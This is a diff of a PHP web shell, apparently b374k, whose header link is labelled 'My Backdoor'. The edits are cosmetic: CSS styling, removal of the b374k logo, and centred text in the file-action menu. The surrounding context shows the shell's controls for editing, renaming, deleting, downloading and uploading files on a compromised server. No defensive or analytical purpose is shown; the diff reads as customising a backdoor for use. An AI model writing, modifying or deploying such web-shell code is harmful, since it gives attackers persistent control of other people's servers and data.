@@ -958,10 +958,13 @@ if(!function_exists('decode_line')){
 			}
 			table{
 				width:100%;
+				padding: 20px;
+				background: #787878;
 				border-collapse: collapse;
 				border-spacing: 0;
+				border-radius: 10px;
 			}
-			table td, table th{
+			td, th{
 				vertical-align:middle;
 				padding:8px;
 			}
@@ -1267,7 +1270,6 @@ if(!function_exists('decode_line')){
 			.dataView th{
 				vertical-align:middle;
 				border-bottom:0;
-				background:#4C4C4C;
 				font-size: 20px;
 			}
 			.dataView tfoot td{
@@ -1372,8 +1374,7 @@ if(!function_exists('decode_line')){
 		<div id='wrapper'>
 			<div id='header'>
 				<div id='headerNav'>
-					<span><a onclick="set_cookie('cwd', '');" href='<?php echo getSelf(); ?>'>My Backdoor</a></span>
-					<img onclick='viewfileorfolder();' id='b374k' src='<?php echo getResource('b374k');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>
+					<span><a onclick="set_cookie('cwd', '');" href='<?php echo getSelf(); ?>'>My Backdoor</a></span>&nbsp;<span id='nav'><?php echo $nav; ?></span>
 				</div>
 			</div>
 			
@@ -1914,7 +1915,7 @@ function action(path, type){
 	title = "Action";
 	content = '';
 	if(type=='file') {
-		content = "<table class='boxtbl'><tr><td><img class='icon menu' src='"+getIcon(path)+"'>"+baseName(path)+"</td></tr><tr data-path='"+path+"'><td><span class='edit button'>Edit</span><span class='ren button'>Rename</span><span class='del button'>Delete</span><span class='dl button'>Download</span></td></tr></table>";
+		content = "<table class='boxtbl'><tr><td style='text-align:center;'><img class='icon menu' src='"+getIcon(path)+"'>"+baseName(path)+"</td></tr><tr data-path='"+path+"'><td><span class='edit button'>Edit</span><span class='ren button'>Rename</span><span class='del button'>Delete</span><span class='dl button'>Download</span></td></tr></table>";
 	}
 	if(type=='dir') {
 		content = "<table class='boxtbl'><tr><td><img class='icon menu' src='https://cdn-icons-png.flaticon.com/512/891/891094.png'><input style='width:86%;background:none;border:none;color:#fff;' type='text' value='"+path+"' disabled></td></tr><tr data-path='"+path+"'><td><span class='find button'>Find</span><span class='ul button'>Upload</span><span class='ren button'>Rename</span><span class='del button'>Delete</span></td></tr></table>";
